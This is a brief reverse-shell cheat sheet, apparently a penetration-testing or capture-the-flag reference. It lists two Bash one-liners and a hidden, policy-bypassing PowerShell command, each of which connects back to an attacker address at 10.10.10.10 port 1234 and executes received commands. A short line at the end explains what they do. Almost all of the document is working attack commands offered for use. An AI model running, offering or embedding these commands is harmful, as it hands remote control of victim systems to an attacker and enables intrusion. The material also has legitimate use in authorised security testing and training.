# REVERSE SHELL
## Reliable command to spun up a reverse shell to connect back to the attacker
### Bash 1
`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`
### Bash 2
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`

### Powershell command
`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
`

### Both commands creates a TCP client connection to the IP address "10.10.10.10" on port 1234. It establishes a network stream and reads data from that stream. The received data is then executed as a Bash and PowerShell command, and the output is sent back to the client.


